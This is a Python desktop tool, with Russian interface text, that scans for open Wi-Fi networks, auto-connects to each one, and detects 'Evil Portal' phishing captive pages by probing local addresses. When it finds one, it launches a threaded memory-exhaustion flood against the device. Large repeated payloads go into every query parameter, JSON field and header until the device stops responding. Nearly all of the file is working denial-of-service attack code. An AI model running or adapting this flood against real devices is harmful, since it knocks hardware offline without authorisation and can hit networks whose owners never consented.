import time, threading, os, requests, random
from datetime import datetime

try: from customtkinter import *
except: 
    os.system('pip install setuptools')
    os.system('pip install tkinter')
    os.system('pip install customtkinter')
    print('CustomTkinter успешно установлен!')
    from customtkinter import *

try: import pywifi
except: 
    os.system('pip install setuptools')
    os.system('pip install pywifi')
    print('PyWiFi успешно установлен!')
    import pywifi

try: import requests
except: 
    os.system('pip install setuptools')
    os.system('pip install requests')
    print('Requests успешно установлен!')
    import requests

window = CTk()
window.title('Scanner')
window.geometry('500x500')

def clearall():
    log_text.configure(state='normal')
    log_text.delete('0.0', END)
    log_text.configure(state='disabled')

def add_log(text):
    log_text.configure(state='normal')
    log_text.insert(END, text + '\n') 
    log_text.see(END)
    log_text.configure(state='disabled')

payload = 'vorobushek'*100000 # 10000 KB OR 10 MB RAM (its a lot for a m5stickc plus2 lol)

def send(ssid,action,):
    global tobr
    try:
        r = requests.get(action+"?email="+payload+"&password="+payload+'&phone='+payload, json={'email': payload, 'password': payload, 'phone': payload}, headers={'user-agent': payload, 'cookie': payload, 'accept': payload, 'accept-encoding': payload, 'accept-language': payload}, timeout=5)
        r = requests.post(action+"?email="+payload+"&password="+payload+'&phone='+payload, json={'email': payload, 'password': payload, 'phone': payload}, headers={'user-agent': payload, 'cookie': payload, 'accept': payload, 'accept-encoding': payload, 'accept-language': payload}, timeout=5)
    except (requests.Timeout, requests.ConnectionError): 
        add_log(f'Сеть {ssid} успешно атакована!')
        tobr=True
    except Exception as e: add_log(str(e))

def sendp2(ssid,url,action,):
    global tobr
    try:
        r = requests.get(url+action+"?email="+payload+"&password="+payload+'&phone='+payload, json={'email': payload, 'password': payload, 'phone': payload}, headers={'user-agent': payload, 'cookie': payload, 'accept': payload, 'accept-encoding': payload, 'accept-language': payload}, timeout=5)
        r = requests.post(url+action+"?email="+payload+"&password="+payload+'&phone='+payload, json={'email': payload, 'password': payload, 'phone': payload}, headers={'user-agent': payload, 'cookie': payload, 'accept': payload, 'accept-encoding': payload, 'accept-language': payload}, timeout=5)
    except (requests.Timeout, requests.ConnectionError): 
        add_log(f'Сеть {ssid} успешно атакована!')
        tobr=True
    except Exception as e: add_log(str(e))

def sendp(ssid,url,method,payload2):
    global tobr
    try:
        r = requests.get(url+method+payload2)
        r = requests.post(url+method+payload2)
    except (requests.Timeout, requests.ConnectionError): 
        add_log(f'Сеть {ssid} успешно атакована!')
        tobr=True
    except Exception as e: add_log(str(e))

def attack(ssid, payload, url):

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    iface.disconnect()
    time.sleep(1)   
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = pywifi.const.AUTH_ALG_OPEN  
    profile.akm.append(pywifi.const.AKM_TYPE_NONE)  
    profile.cipher = pywifi.const.AKM_TYPE_NONE  
    profile.key = ''  

    iface.connect(iface.add_network_profile(profile))
    tobr=False
    
    for i in range(100):
        if iface.status() == pywifi.const.IFACE_CONNECTED:
            try:
                # SSID RAM FUCK exploit method
                r = requests.get(url+'ssid', timeout=10)
                #try:
                actionm = r.text.split("action=")
                action = actionm[1].split(" ")[0].replace("'", '').replace('"', '')
                if not action.startswith('/') and not action.startswith('http'): action='/'+action
                if not action.startswith('http'): action = url+action
                add_log(f'Найдена ссылка: {action}')
                add_log(f'Атакуем {ssid} через SSID метод...')
                thrs = []
                for i in range(5):
                    thr = threading.Thread(target=send, args=(ssid,action,))
                    thr.start()
                    thrs.append(thr)
                for thr in thrs:thr.join()

                if tobr:break
                #except:...
                # GET DATA RAM FUCK exploit method
                r = requests.get(url, timeout=10)
                yall = ['/post', '/get', '/postcreds', '/creds', '/add']
                for method in yall:
                    if method in r.text: 
                        add_log(f'Найдена ссылка: {method}')
                        add_log(f'Атакуем {ssid} через CREDS метод...')
                        payload2 = '?email=24wpoerufjklasdhrkj53hrekjdfhnk23hdef'
                        for i in range(100): payload2+=f'&{"".join(random.choices("qwertyuiopasdfghjklzxcvbnm1234567890", k=6))}={"".join(random.choices("qwertyuiopasdfghjklzxcvbnm1234567890", k=64))}'
                        thrs2 = []
                        for i in range(100):
                            thr = threading.Thread(target=sendp, args=(ssid,url,method,payload2,))
                            thr.start()
                            thrs2.append(thr)
                        for thr in thrs2:thr.join()
                        thrs = []
                        for i in range(5):
                            thr = threading.Thread(target=sendp2, args=(ssid,url,method,))
                            thr.start()
                            thrs.append(thr)
                        for thr in thrs:thr.join()
                if tobr:break
                if '<form' in r.text:

                    try:
                        actionm = r.text.split("action=")
                        action = actionm[1].split(" ")[0].replace("'", '').replace('"', '')
                        if not action.startswith('/') and not action.startswith('http'): action='/'+action
                        if not action.startswith('http'): action = url+action
                        add_log(f'Найдена ссылка: {action}')
                        add_log(f'Атакуем {ssid} через CREDS метод...')
                        payload2 = '?email=24wpoerufjklasdhrkj53hrekjdfhnk23hdef'
                        for i in range(100): payload2+=f'&{"".join(random.choices("qwertyuiopasdfghjklzxcvbnm1234567890", k=6))}={"".join(random.choices("qwertyuiopasdfghjklzxcvbnm1234567890", k=64))}'
                        thrs2 = []
                        for i in range(100):
                            thr = threading.Thread(target=sendp, args=(ssid,'',action,payload2,))
                            thr.start()
                            thrs2.append(thr)
                        for thr in thrs2:thr.join()
                        thrs = []
                        for i in range(5):
                            thr = threading.Thread(target=send, args=(ssid,action,))
                            thr.start()
                            thrs.append(thr)
                        for thr in thrs:thr.join()
                    except:...
                if tobr:break

                if 'fetch' in r.text:

                    try:
                        action = r.text.split('fetch(')[1].split('?')[0].replace("'", '').replace('"', '')
                        if not action.startswith('/') and not action.startswith('http'): action='/'+action
                        if not action.startswith('http'): action = url+action
                        add_log(f'Найдена ссылка: {action}')
                        add_log(f'Атакуем {ssid} через CREDS метод...')
                        payload2 = '?email=24wpoerufjklasdhrkj53hrekjdfhnk23hdef'
                        for i in range(100): payload2+=f'&{"".join(random.choices("qwertyuiopasdfghjklzxcvbnm1234567890", k=6))}={"".join(random.choices("qwertyuiopasdfghjklzxcvbnm1234567890", k=64))}'
                        thrs2 = []
                        for i in range(100):
                            thr = threading.Thread(target=sendp, args=(ssid,'',action,payload2,))
                            thr.start()
                            thrs2.append(thr)
                        for thr in thrs2:thr.join()
                        thrs = []
                        for i in range(5):
                            thr = threading.Thread(target=send, args=(ssid,action,))
                            thr.start()
                            thrs.append(thr)
                        for thr in thrs:thr.join()
                    except:...

                if tobr:break

                if 'XMLHttpRequest' in r.text:

                    try:
                        action = r.text.replace('\n', '').split('XMLHttpRequest();')[1].split(')')[0].split("'")[3]
                        if not action.startswith('/') and not action.startswith('http'): action='/'+action
                        if not action.startswith('http'): action = url+action
                        add_log(f'Найдена ссылка: {action}')
                        add_log(f'Атакуем {ssid} через CREDS метод...')
                        payload2 = '?email=24wpoerufjklasdhrkj53hrekjdfhnk23hdef'
                        for i in range(100): payload2+=f'&{"".join(random.choices("qwertyuiopasdfghjklzxcvbnm1234567890", k=6))}={"".join(random.choices("qwertyuiopasdfghjklzxcvbnm1234567890", k=64))}'
                        thrs2 = []
                        for i in range(100):
                            thr = threading.Thread(target=sendp, args=(ssid,'',action,payload2,))
                            thr.start()
                            thrs2.append(thr)
                        for thr in thrs2:thr.join()
                        thrs = []
                        for i in range(5):
                            thr = threading.Thread(target=send, args=(ssid,action,))
                            thr.start()
                            thrs.append(thr)
                        for thr in thrs:thr.join()
                    except:...
                    
                if tobr:break
            except (requests.Timeout, requests.ConnectionError): 
                add_log(f'Сеть {ssid} успешно атакована!')
                tobr=True
            except Exception as e: add_log(str(e))
        time.sleep(0.1)
        if tobr: break

def scan():

    while True:

        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.scan()
        time.sleep(3)
        results = iface.scan_results()

        clearall()

        add_log('Проверяем сети на наличие Evil Portal...')

        evilportals = []

        for result in results:

            if result.ssid.replace(' ', '').replace('\n', '') != '':

                if result.akm == [pywifi.const.AKM_TYPE_NONE] and result.cipher == pywifi.const.AKM_TYPE_NONE:

                    for i in evilportals: 
                        #add_log(i)
                        if i[1] == result.ssid: continue

                    iface.disconnect()
                    time.sleep(1)   
                    #add_log(result.ssid)
                    profile = pywifi.Profile()
                    profile.ssid = result.ssid
                    profile.auth = pywifi.const.AUTH_ALG_OPEN  
                    profile.akm.append(pywifi.const.AKM_TYPE_NONE)  
                    profile.cipher = pywifi.const.AKM_TYPE_NONE  
                    profile.key = ''  

                    iface.connect(iface.add_network_profile(profile))

                    breakk = False

                    for i in range(60):

                        for lur in ['http://172.0.0.1/', 'http://172.0.0.1/', 'http://192.168.4.1/', 'http://192.168.4.1/']:
                            if iface.status() == pywifi.const.IFACE_CONNECTED:
                                try:
                                    r = requests.get(f'{lur}ssid', timeout=5)
                                    if "<div class=form-container>" in r.text: 
                                        evilportals.append(['Evil', result.ssid, lur])
                                    else: raise
                                    breakk = True
                                    break
                                except:...

                            time.sleep(0.1)

                        if breakk: break

                else:

                    evilportals.append(['Paswd', result.ssid])

        #iface.disconnect()

        if evilportals != []:
            add_log('Результаты:')
            for i, network in enumerate(evilportals): 
                if network[0] == 'Evil':
                    add_log(f'{i+1}: {network[1]} - Evil Portal (опасная), атакуем...')
                    attack(network[1], payload, network[2])
                if network[0] == 'Paswd':
                    add_log(f'{i+1}: {network[1]} - С паролем (безопасная)')
                if network[0] == 'Normal':
                    add_log(f'{i+1}: {network[1]} - Без пароля (безопасная)')

            # by freedomleaker

bg = '#2B2B2B'

CTkFrame(window, width=480, height=480).place(x=10, y=10)

scannerlbl = CTkLabel(window, text='Сканнер', bg_color=bg, font=('Calibri', 36))
scannerlbl.place(x=200, y=20)

log_text = CTkTextbox(window, width=460, height=410)
log_text.configure(state='disabled', font=('Calibri', 15))
log_text.place(x=20, y=70)

add_log('Всё будет тут')

threading.Thread(target=scan).start()

window.mainloop()